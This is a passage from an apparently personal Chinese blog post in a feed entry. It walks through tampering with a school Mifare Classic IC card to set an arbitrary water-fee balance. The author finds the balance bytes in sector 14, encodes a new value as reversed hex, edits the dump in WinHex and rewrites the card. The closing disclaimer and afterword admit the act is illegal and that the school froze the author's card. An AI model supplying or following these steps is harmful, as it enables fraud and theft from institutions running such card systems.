alt=""><br>　　上一步骤得到的修复后文件，其中文件信息内显示的就是我们卡里面的数据，关于IC卡的结构，我们简单说一下，IC卡内一般有从0到15共16个扇区，每个扇区都有独立的密码，每个扇区都有0到3共4个段，每张卡还有一个全球唯一UID号在0扇区里。我们的校园卡，在0、1、2、3、14号扇区加了密码，并且里面有数据，其他扇区无数据为默认密码。我们将这几个扇区的数据提取出来。<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture11.PNG" alt=""><br>　　在这里面数据都是以16进制储存的，并且是倒序放置，经过分析，水费数据存在于14扇区，将他们再提取出来看看，我这里综合了四张卡的数据：<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture16.PNG" alt=""><br>　　根据在学校水房机器上的显示的余额，<strong>172</strong>、<strong>612</strong>，转换为16进制就是<strong>00AC</strong>、<strong>0264</strong>。<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture13.PNG" alt=""><br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture15.PNG" alt=""><br>　　又因为是倒序排列，所以转换为AC00、6402，正好与14扇区前四位吻合！根据网上其他人的介绍，这些数据和后面的几位是有联系的，就像身份证上的校验码，而且很复杂，如果我们不知道他们在设计时的算法的话，很难琢破解。于是我在这里纠结了一整天，找前四位与后面数据的关系，甚至分析网上别的人的数据来寻求共同点。<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture12.PNG" alt=""><br>　　忙了一天都没有找到他的算法。就在我认为注定失败的时候，同学说会不会根本就没什么联系，我说应该不会吧，别人的都有啊。可是事实是，咱学校的真奇葩，他偏偏没有任何联系……在那个星期回学校试刷了之后，果真不需要修改后面的数据！<br>所以我们直接进入下一步。<br>　　此时打开另一个软件<strong>WinHex</strong> ，将修复后的dump文件拖进去。<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture5.PNG" alt=""><br>　　找到第14扇区0段和1段，也就是390和3A0行。<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture6.PNG" alt=""><br>　　我们将要修改成的数据转换为16进制然后倒序排列，就可以了！比如88.88元，十六进制就是22B8，倒序就是B822，修改后保存就可以了！</p><h4 id="写入数据"><a href="#写入数据" class="headerlink" title="写入数据"></a>写入数据</h4><p>　　写IC卡的软件比较多，个人觉得下面这一款比较简单好用：<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture7.PNG" alt=""><br>　　我们直接将修改后的dump文件拖进去，点击写卡就OK了，速度很快的。<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture10.PNG" alt=""><br>　　至此，一个任意水费的校园卡就到手了，妈妈再也不用担心我上火了……<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/pic4.jpg" alt=""><br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/pic1.jpg" alt=""><br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/pic7.jpg" alt=""></p><h2 id="一些声明"><a href="#一些声明" class="headerlink" title="一些声明"></a>一些声明</h2><p>　　在网上收集资料的时候发现有一个神奇的手机软件<strong>Mifare Classic Tool</strong>，该软件需要NFC支持，用这个软件在破解完密码，将dump文件直接丢进手机里，直接可以在手机上操作，然后用手机直接写入。</p><p>　　接下来我们说一说前文提到的不能修改饭钱的原因，主要有两点，一是咱学校的水费系统是不联网的，也就是说水房每个机子并没有后台控制，数据是离线的。而我们的饭卡系统，则每台都有网线连接着，后面有着储存我们数据的终端，修改了数据不一定可用，也有可能不像上边那样简简单单的只改四位数据。第二点呢，就是水费我们是不需要现金充值的，而饭费需要我们现金充值，这也许会触动法律了~搞不好就不能在一块玩耍了……<br>　　所以大家满足于水费就可以了 ~<br>　　还有一点，修改后的卡如果拿去卡务中心想着再返一次水费，那么恭喜你，水费会变为几块钱十几块钱。。<br>　　还有如果有错误的地方，希望大家指出，欢迎交流哈。<br>　　本帖仅供学习交流，技术研究之用，请勿用于非法用途，否则后果自负。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>　　本文写于高二时期，当时贴吧反响不小，但被学校校园卡中心的人盯上，本人校园卡被冻结。随后被班主任与教务处主任、分管校长约谈，告诉我学校每月四元的水费是教育局拨款，我这样做是<strong>不对的</strong>，然后让我删除了帖子，并保证不再继续此类活动。最后此事才得以平息。<br>　　本文发表与此，只是做技术交流之用。对于各大高校的饭卡、水卡的系统任何破解行为，都是违法的！各类相似事件也是层出不穷。。比如 <a href="https://www.ithome.com/html/it/289534.htm" target="_blank" rel="noopener">这一个北邮的童鞋</a>。<br>　　所以希望大家，不要贪图小便宜，虽然技术无罪，但人心不要可耻。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;　　本文算是写过的第一篇技术文章，于高二下学期。当时发帖于贴吧，但由于一些原因被迫删帖。现在搭建好了个人博客，便想修改一下将此文作为本博客第一篇文章。&lt;br&gt;　　高二时期，由于学校每月返还四元的的水费不够用,加上看到别的同学因系统错误而偶然获得的两张九万多的水卡，便驱动着自己去对此暗暗了解一番。&lt;br&gt;  &lt;strong&gt;以下为原帖内容，少数文字被修改&lt;/strong&gt;。&lt;br&gt;
    
    </summary>
    
    
      <category term="硬件" scheme="https://blog.0bug.xyz/tags/%E7%A1%AC%E4%BB%B6/"/>
    
      <category term="IC" scheme="https://blog.0bug.xyz/tags/IC/"/>
    
  </entry>
  
</feed>
